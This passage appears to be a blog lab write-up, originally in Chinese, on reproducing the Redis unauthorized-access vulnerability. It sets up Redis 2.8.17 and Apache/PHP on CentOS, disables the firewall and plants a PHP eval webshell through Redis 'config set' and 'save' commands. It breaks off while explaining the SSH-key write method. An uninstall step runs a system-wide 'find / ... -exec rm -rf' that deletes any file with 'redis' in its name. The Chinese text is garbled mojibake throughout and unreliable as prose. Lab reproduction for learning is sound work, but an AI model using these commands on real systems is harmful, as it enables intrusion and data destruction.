æ˜¯ä¸€ç§æµè¡Œçš„å‹ç¼©å·¥å…·ï¼Œé€šå¸¸ç”¨äºå‹ç¼©å•ä¸ªæ–‡ä»¶ã€‚</li><li><strong>x</strong>ï¼šè¿™ä¸ªé€‰é¡¹è¡¨ç¤ºè§£å‹ç¼©ï¼ˆextractï¼‰ï¼Œå³ä»å‹ç¼©æ–‡ä»¶ä¸­æå–æ–‡ä»¶ã€‚</li><li><strong>f</strong>ï¼šè¿™ä¸ªé€‰é¡¹åé¢è·Ÿç€çš„æ˜¯è¦æ“ä½œçš„æ–‡ä»¶åã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ–‡ä»¶åæ˜¯ <code>redis-4.0.10.tar.gz</code>ã€‚</li></ul></blockquote><ul><li>makeç¼–è¯‘</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> redis-4.0.10<span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><h3 id="å¤§æˆ˜bug-ã€Œæºç å®‰è£…redisæ—¶makeæŠ¥é”™ã€"><a href="#å¤§æˆ˜bug-ã€Œæºç å®‰è£…redisæ—¶makeæŠ¥é”™ã€" class="headerlink" title="å¤§æˆ˜bug-ã€Œæºç å®‰è£…redisæ—¶makeæŠ¥é”™ã€"></a>å¤§æˆ˜bug-ã€Œæºç å®‰è£…redisæ—¶makeæŠ¥é”™ã€</h3><p>æ‰§è¡Œ<code>make</code>å‘½ä»¤æŠ¥é”™ï¼š</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.23.36.png" style="zoom:40%;"><p>åˆ†æåˆ¤æ–­æ˜¯æ²¡æœ‰å®‰è£…gccçš„åŸå› ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> gcc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®‰è£…åé‡æ–°æ‰§è¡Œ<code>make</code></p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.27.18.png" style="zoom:40%;"><p>è¿˜æ˜¯æŠ¥é”™ã€‚</p><p>æ·»åŠ å¦‚ä¸‹å‚æ•°ï¼Œç»§ç»­æ‰§è¡Œmake</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token assign-left variable">MALLOC</span><span class="token operator">=</span>libc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.30.00.png" style="zoom:40%;"></blockquote><ul><li>make installå®‰è£…</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.31.16.png" style="zoom:40%;"><h4 id="3ï¼‰å¯åŠ¨æœåŠ¡-redis-server"><a href="#3ï¼‰å¯åŠ¨æœåŠ¡-redis-server" class="headerlink" title="3ï¼‰å¯åŠ¨æœåŠ¡(redis-server)"></a>3ï¼‰å¯åŠ¨æœåŠ¡(redis-server)</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.32.54.png" style="zoom:50%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.33.27.png" style="zoom:50%;"><p>æŸ¥çœ‹æœåŠ¡æ˜¯å¦å¯åŠ¨æˆåŠŸï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span> <span class="token function">grep</span> redisæˆ–<span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> redisæˆ–<span class="token function">netstat</span> <span class="token parameter variable">-pantu</span> <span class="token operator">|</span> <span class="token function">grep</span> redis<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li><strong>-e</strong>ï¼šè¡¨ç¤ºæ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ã€‚</li><li><strong>-f</strong>ï¼šè¡¨ç¤ºæ˜¾ç¤ºå®Œæ•´çš„æ ¼å¼ï¼ŒåŒ…æ‹¬ç”¨æˆ·ã€PIDï¼ˆè¿›ç¨‹IDï¼‰ã€çˆ¶è¿›ç¨‹IDã€å¯åŠ¨æ—¶é—´ã€CPUå’Œå†…å­˜ä½¿ç”¨æƒ…å†µç­‰è¯¦ç»†ä¿¡æ¯ã€‚</li></ul></blockquote><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.34.04.png" style="zoom:40%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.35.43.png" style="zoom:40%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.36.31.png" style="zoom:40%;"><h3 id="2-2-2-æ”»å‡»æœºå®‰è£…rediså®¢æˆ·ç«¯ï¼ˆredis-cliï¼‰"><a href="#2-2-2-æ”»å‡»æœºå®‰è£…rediså®¢æˆ·ç«¯ï¼ˆredis-cliï¼‰" class="headerlink" title="2.2.2 æ”»å‡»æœºå®‰è£…rediså®¢æˆ·ç«¯ï¼ˆredis-cliï¼‰"></a>2.2.2 æ”»å‡»æœºå®‰è£…rediså®¢æˆ·ç«¯ï¼ˆredis-cliï¼‰</h3><h4 id="1ï¼‰ä¸‹è½½redis-4-0-10-1"><a href="#1ï¼‰ä¸‹è½½redis-4-0-10-1" class="headerlink" title="1ï¼‰ä¸‹è½½redis-4.0.10"></a>1ï¼‰ä¸‹è½½redis-4.0.10</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://download.redis.io/releases/redis-4.0.10.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.38.51.png" style="zoom:40%;"><h4 id="2ï¼‰å®‰è£…"><a href="#2ï¼‰å®‰è£…" class="headerlink" title="2ï¼‰å®‰è£…"></a>2ï¼‰å®‰è£…</h4><p>è§£å‹ï¼Œç¼–è¯‘</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> zxf redis-4.0.10.tar.gz<span class="token builtin class-name">cd</span> redis-4.0.10<span class="token function">make</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.42.22.png" style="zoom:30%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.42.47.png" style="zoom:40%;"><h4 id="3ï¼‰æµ‹è¯•rediså®¢æˆ·ç«¯æ˜¯å¦å®‰è£…å®Œæˆ"><a href="#3ï¼‰æµ‹è¯•rediså®¢æˆ·ç«¯æ˜¯å¦å®‰è£…å®Œæˆ" class="headerlink" title="3ï¼‰æµ‹è¯•rediså®¢æˆ·ç«¯æ˜¯å¦å®‰è£…å®Œæˆ"></a>3ï¼‰æµ‹è¯•rediså®¢æˆ·ç«¯æ˜¯å¦å®‰è£…å®Œæˆ</h4><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.43.34.png" style="zoom:40%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.43.57.png" style="zoom:50%;"><h3 id="2-2-3-æ¼æ´æµ‹è¯•"><a href="#2-2-3-æ¼æ´æµ‹è¯•" class="headerlink" title="2.2.3 æ¼æ´æµ‹è¯•"></a>2.2.3 æ¼æ´æµ‹è¯•</h3><p>æµ‹è¯•ç›®æ ‡é¶æœºæ˜¯å¦å­˜åœ¨æœªæˆæƒè®¿é—®,ä¸‹å›¾è¯´æ˜é¶æœºä¸å­˜åœ¨æœªæˆæƒè®¿é—®ï¼š</p><p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.51.28.png" alt="æˆªå±2025-01-08 13.51.28"></p><p>redis-4.0.10 å¤ç°å¤±è´¥ã€‚ âœ…</p><p>Redisåœ¨3.2.0ä¹‹åå¢åŠ äº†ä¸€ä¸ªä¿æŠ¤æ¨¡å¼ï¼Œé»˜è®¤è¿˜æ˜¯æ— å¯†ç ï¼Œä½†æ˜¯é™åˆ¶äº†åªæœ‰æœ¬åœ°(å›ç¯æ¥å£)æ‰èƒ½è®¿é—®ã€‚</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.56.18.png" style="zoom:30%;"><h3 id="2-2-4-å¸è½½redis"><a href="#2-2-4-å¸è½½redis" class="headerlink" title="2.2.4 å¸è½½redis"></a>2.2.4 å¸è½½redis</h3><p>åœæ­¢æœåŠ¡ï¼Œctrl+cå³å¯ã€‚</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.54.39.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> <span class="token string">"*redis*"</span> <span class="token parameter variable">-exec</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-2-æ¼æ´ç¯å¢ƒæ­å»ºåŠæ¼æ´æµ‹è¯•ï¼ˆredis-2-8-17-å¤ç°æˆåŠŸï¼‰"><a href="#2-2-æ¼æ´ç¯å¢ƒæ­å»ºåŠæ¼æ´æµ‹è¯•ï¼ˆredis-2-8-17-å¤ç°æˆåŠŸï¼‰" class="headerlink" title="2.2 æ¼æ´ç¯å¢ƒæ­å»ºåŠæ¼æ´æµ‹è¯•ï¼ˆredis-2.8.17 å¤ç°æˆåŠŸï¼‰"></a>2.2 <strong>æ¼æ´ç¯å¢ƒæ­å»º</strong>åŠæ¼æ´æµ‹è¯•ï¼ˆredis-2.8.17 å¤ç°æˆåŠŸï¼‰</h2><h3 id="2-2-1-é¶æœºå®‰è£…redis-2-8-17"><a href="#2-2-1-é¶æœºå®‰è£…redis-2-8-17" class="headerlink" title="2.2.1 é¶æœºå®‰è£…redis-2.8.17"></a>2.2.1 é¶æœºå®‰è£…redis-2.8.17</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://download.redis.io/releases/redis-2.8.17.tar.gz<span class="token function">tar</span> zxf redis-2.8.17.tar.gz <span class="token builtin class-name">cd</span> redis-2.8.17<span class="token function">make</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.04.37.png" style="zoom:50%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.05.43.png" style="zoom:50%;"><p>æ‰§è¡Œå¤±è´¥ã€‚</p><p>éœ€è¦cdåˆ°srcç›®å½•ä¸­æ‰§è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> src./redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.10.13.png" style="zoom:50%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.15.32.png" alt="æˆªå±2025-01-08 14.15.32" style="zoom:50%;"><p>è®¿é—®192.168.5.4è®¿é—®ä¸äº†ã€‚</p><p>è®¿é—®127.0.0.1 æ‰å¯ä»¥è®¿é—®ã€‚</p><h3 id="2-2-2-kaliå®‰è£…redis-2-8-17-cli"><a href="#2-2-2-kaliå®‰è£…redis-2-8-17-cli" class="headerlink" title="2.2.2 kaliå®‰è£…redis-2.8.17-cli"></a>2.2.2 kaliå®‰è£…redis-2.8.17-cli</h3><p>å¯ä»¥æŒ‰ç…§å¦‚ä¸‹è¿‡ç¨‹å®‰è£…ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨redis</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://download.redis.io/releases/redis-2.8.17.tar.gz<span class="token function">tar</span> zxf redis-2.8.17.tar.gz <span class="token builtin class-name">cd</span> redis-2.8.17<span class="token function">make</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.30.41.png" alt="æˆªå±2025-01-08 14.30.41" style="zoom:50%;"><p>åœ¨kaliä¸Šå®‰è£…çš„æ—¶å€™æ²¡æœ‰æ‰§è¡Œå¸è½½åŠ¨ä½œï¼Œå®‰è£…å®Œæˆä¹‹åç‰ˆæœ¬è‡ªåŠ¨å˜æ›´äº†ã€‚</p><p>å…¶å®ç”¨åŸæ¥çš„4.0.10ç‰ˆæœ¬ä¹Ÿå¯ä»¥ã€‚</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.18.55.png" style="zoom:50%;"><p>æ— æ³•è®¿é—®ï¼Œä½†æ˜¯èƒ½pingé€š192.168.52.4ã€‚</p><h3 id="2-2-3-å…³é—­centos7çš„é˜²ç«å¢™"><a href="#2-2-3-å…³é—­centos7çš„é˜²ç«å¢™" class="headerlink" title="2.2.3 å…³é—­centos7çš„é˜²ç«å¢™"></a>2.2.3 å…³é—­centos7çš„é˜²ç«å¢™</h3><p>æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl status firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.26.41.png" style="zoom:50%;"><p>åœæ­¢é˜²ç«å¢™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl stop firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…³é—­é˜²ç«å¢™ä¹‹åè®¿é—®æµ‹è¯•æˆåŠŸï¼š</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.27.33.png" style="zoom:50%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.32.02.png" alt="ç”¨4.0.10çš„å®¢æˆ·ç«¯ä¹Ÿèƒ½è®¿é—®ï¼Œæ²¡å¿…è¦é‡æ–°å®‰è£…2.8.17ç‰ˆæœ¬" style="zoom:40%;"><h3 id="2-2-4-æ¼æ´æµ‹è¯•"><a href="#2-2-4-æ¼æ´æµ‹è¯•" class="headerlink" title="2.2.4 æ¼æ´æµ‹è¯•"></a>2.2.4 æ¼æ´æµ‹è¯•</h3><h4 id="1ï¼‰æœªæˆæƒè®¿é—®æµ‹è¯•"><a href="#1ï¼‰æœªæˆæƒè®¿é—®æµ‹è¯•" class="headerlink" title="1ï¼‰æœªæˆæƒè®¿é—®æµ‹è¯•"></a>1ï¼‰æœªæˆæƒè®¿é—®æµ‹è¯•</h4><p>æµ‹è¯•ç›®æ ‡é¶æœºæ˜¯å¦å­˜åœ¨æœªæˆæƒè®¿é—®,ä¸‹å›¾è¯´æ˜é¶æœºå­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.35.12.png" style="zoom:40%;"><h3 id="2-2-5-å¯åŠ¨apache-webæœåŠ¡"><a href="#2-2-5-å¯åŠ¨apache-webæœåŠ¡" class="headerlink" title="2.2.5 å¯åŠ¨apache webæœåŠ¡"></a>2.2.5 å¯åŠ¨apache webæœåŠ¡</h3><p>ä¸ºäº†å¤ç°å†™å…¥webshellçš„åˆ©ç”¨æ–¹æ³•ï¼Œå®‰è£…å¯åŠ¨apache webæœåŠ¡ã€‚</p><h4 id="1ï¼‰å®‰è£…-Apache"><a href="#1ï¼‰å®‰è£…-Apache" class="headerlink" title="1ï¼‰å®‰è£… Apache"></a>1ï¼‰å®‰è£… Apache</h4><p>CentOS 7 ä½¿ç”¨ <code>yum</code> ä½œä¸ºåŒ…ç®¡ç†å™¨ã€‚è¦å®‰è£… Apache HTTP æœåŠ¡å™¨ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> httpd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2ï¼‰å¯åŠ¨-Apache-æœåŠ¡"><a href="#2ï¼‰å¯åŠ¨-Apache-æœåŠ¡" class="headerlink" title="2ï¼‰å¯åŠ¨ Apache æœåŠ¡"></a>2ï¼‰å¯åŠ¨ Apache æœåŠ¡</h4><p>å®‰è£…å®Œæˆåï¼Œä½ å¯ä»¥ä½¿ç”¨ <code>systemctl</code> å‘½ä»¤æ¥å¯åŠ¨ Apache æœåŠ¡ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl start httpd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.40.44.png" style="zoom:40%;"><h4 id="3ï¼‰è®¿é—®æµ‹è¯•"><a href="#3ï¼‰è®¿é—®æµ‹è¯•" class="headerlink" title="3ï¼‰è®¿é—®æµ‹è¯•"></a>3ï¼‰è®¿é—®æµ‹è¯•</h4><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.41.50.png" style="zoom:30%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"&lt;?php phpinfo(); ?&gt;"</span> <span class="token operator">&gt;</span> /home/www/index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.57.12.png" style="zoom:50%;"><p>è®¿é—®ä¹‹åå‘ç°phpæ²¡æœ‰è¢«è§£æã€‚</p><p>éœ€è¦å®‰è£…å¹¶é…ç½®phpè§£æã€‚</p><h3 id="2-2-6-å®‰è£…PHP"><a href="#2-2-6-å®‰è£…PHP" class="headerlink" title="2.2.6 å®‰è£…PHP"></a>2.2.6 å®‰è£…PHP</h3><h4 id="1-å®‰è£…-PHP"><a href="#1-å®‰è£…-PHP" class="headerlink" title="1) å®‰è£… PHP"></a>1) å®‰è£… PHP</h4><p>CentOS 7 é»˜è®¤ä½¿ç”¨ <code>yum</code> ä½œä¸ºåŒ…ç®¡ç†å™¨ã€‚è¦å®‰è£… PHPï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> php php-mysqlnd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œ <code>php-mysqlnd</code> æ˜¯ MySQL çš„ PHP æ‰©å±•ï¼Œå¦‚æœä½ çš„ PHP è„šæœ¬éœ€è¦ä¸ MySQL æ•°æ®åº“äº¤äº’ï¼Œè¿™ä¸ªæ‰©å±•æ˜¯å¿…è¦çš„ã€‚</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.50.34.png" style="zoom:50%;"><h4 id="2ï¼‰é…ç½®-Apache-ä»¥å¤„ç†-PHP"><a href="#2ï¼‰é…ç½®-Apache-ä»¥å¤„ç†-PHP" class="headerlink" title="2ï¼‰é…ç½® Apache ä»¥å¤„ç† PHP"></a>2ï¼‰é…ç½® Apache ä»¥å¤„ç† PHP</h4><p>ä¸éœ€è¦ç‰¹åˆ«çš„é…ç½®ï¼Œé‡å¯ä¸€ä¸‹httpæœåŠ¡å³å¯ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart httpd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.59.32.png" style="zoom:50%;"><h2 id="2-3-æ¼æ´åˆ©ç”¨"><a href="#2-3-æ¼æ´åˆ©ç”¨" class="headerlink" title="2.3 æ¼æ´åˆ©ç”¨"></a>2.3 æ¼æ´åˆ©ç”¨</h2><h3 id="2-3-1-å†™webshell"><a href="#2-3-1-å†™webshell" class="headerlink" title="2.3.1 å†™webshell"></a>2.3.1 å†™webshell</h3><p>åˆ©ç”¨æ¡ä»¶ï¼šç›®æ ‡å¼€å¯äº†webæœåŠ¡å™¨,å¹¶ä¸”çŸ¥é“webè·¯å¾„(å¯ä»¥åˆ©ç”¨phpinfoæˆ–è€…é”™è¯¯æš´è·¯å¾„ç­‰)ï¼Œè¿˜éœ€è¦å…·æœ‰è¯»å†™å¢åˆ æ”¹æŸ¥æƒé™ã€‚</p><ul><li>å†™å…¥webshell</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/www/htmlconfig <span class="token builtin class-name">set</span> dbfilename sxkhack.php<span class="token builtin class-name">set</span> webshell <span class="token string">"<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>&lt;?php eval(<span class="token variable">$_POST</span>['sxk']);?&gt;<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span>save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„ï¼šâ€\r\nâ€æ˜¯å›è½¦æ¢è¡Œçš„æ„æ€ï¼Œç”¨rediså†™å…¥æ–‡ä»¶ä¼šè‡ªå¸¦ä¸€äº›ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¦‚æœä¸æ¢è¡Œå¯èƒ½å¯¼è‡´æ— æ³•æ‰§è¡Œã€‚</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2015.24.15.png" style="zoom:40%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2015.23.14.png" style="zoom:30%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2015.23.49.png" alt="getshell" style="zoom:50%;"><p>æˆåŠŸgetshellã€‚</p><h3 id="2-3-2-é€šè¿‡å†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•"><a href="#2-3-2-é€šè¿‡å†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•" class="headerlink" title="2.3.2 é€šè¿‡å†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•"></a>2.3.2 é€šè¿‡å†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•</h3><h4 id="1ï¼‰sshå¯†é’¥ç™»å½•çš„åŸç†"><a href="#1ï¼‰sshå¯†é’¥ç™»å½•çš„åŸç†" class="headerlink" title="1ï¼‰sshå¯†é’¥ç™»å½•çš„åŸç†"></a>1ï¼‰sshå¯†é’¥ç™»å½•çš„åŸç†</h4><p>é€šè¿‡sshå¯ä»¥è¿œç¨‹ç™»å½•å¦å¤–ä¸€å°ç”µè„‘ã€‚</p><p>sshç™»å½•æœ‰ä¸¤ç§ä¸€ä¸ªæ˜¯å¯†ç ç™»å½•ï¼Œä¸€ä¸ªæ˜¯å¯†é’¥ç™»å½•ã€‚å…¬é’¥ç™»å½•æ˜¯ä¸ºäº†è§£å†³æ¯æ¬¡ç™»å½•æœåŠ¡å™¨éƒ½è¦è¾“å…¥å¯†ç çš„é—®é¢˜ï¼Œæµè¡Œä½¿ç”¨RSAåŠ å¯†æ–¹æ¡ˆï¼Œä¸»è¦æµç¨‹åŒ…å«ï¼š</p><ol><li>å®¢æˆ·ç«¯ç”ŸæˆRSAå…¬é’¥å’Œç§é’¥</li><li>å®¢æˆ·ç«¯å°†è‡ªå·±çš„å…¬é’¥å­˜æ”¾åˆ°æœåŠ¡å™¨</li><li>å®¢æˆ·ç«¯è¯·æ±‚è¿æ¥æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å°†ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å‘é€ç»™å®¢æˆ·ç«¯</li><li>å®¢æˆ·ç«¯æ ¹æ®è‡ªå·±çš„ç§é’¥åŠ å¯†è¿™ä¸ªéšæœºå­—ç¬¦ä¸²ä¹‹åå†å‘é€ç»™æœåŠ¡å™¨</li><li>æœåŠ¡å™¨æ¥å—åˆ°åŠ å¯†åçš„å­—ç¬¦ä¸²ä¹‹åç”¨å…¬é’¥è§£å¯†ï¼Œå¦‚æœæ­£ç¡®å°±è®©å®¢æˆ·ç«¯ç™»å½•ï¼Œå¦åˆ™æ‹’ç»ã€‚è¿™æ ·å°±ä¸ç”¨ä½¿ç”¨å¯†ç äº†ã€‚</li></ol><h4 id="2ï¼‰åˆ©ç”¨å‰æ"><a href="#2ï¼‰åˆ©ç”¨å‰æ" class="headerlink" title="2ï¼‰åˆ©ç”¨å‰æ"></a>2ï¼‰åˆ©ç”¨å‰æ</h4><ul><li><p>å½“redisä»¥rootèº«ä»½è¿è¡Œã€‚</p></li><li><p>é¶æœºredisé“¾æ¥æœªæˆæƒï¼Œåœ¨æ”»å‡»æœºä¸Šèƒ½ç”¨redis-cliè¿ä¸Šã€‚</p></li><li><p>å­˜åœ¨/root/.sshç›®å½•</p></li></ul><p>1ï¼‰å¦‚æœä¸å­˜åœ¨æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€å¥è¯æœ¨é©¬è¿æ¥èšå‰‘åˆ›å»ºç›®å½•ï¼Œä½†æ˜¯webshellè·å–çš„æƒé™æ¯”è¾ƒä½ï¼Œæ²¡æœ‰æƒé™è®¿é—®/rootç›®å½•ã€‚ </p><p>2ï¼‰å¦‚æœæ˜¯è‡ªå·±æ­å»ºçš„é¶åœºå°±è‡ªè¡Œåˆ›å»ºä¸€ä¸ªã€‚</p><p>3ï¼‰æ­¤å¤–ï¼Œæœ‰ç§è¯´æ³•æ˜¯é¶æœºè¢«ä½¿ç”¨ssh root@ipç™»å½•è¿‡å°±ä¼šç”Ÿæˆ.sshæ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘åœ¨centos7ä¸Šæµ‹è¯•ä¸æ˜¯è¿™æ ·çš„ï¼Œè¿˜æ˜¯æ²¡æœ‰.sshç›®å½•ï¼Œå¦‚æœæ˜¯ä½¿ç”¨ç”¨æˆ·åå¯†ç 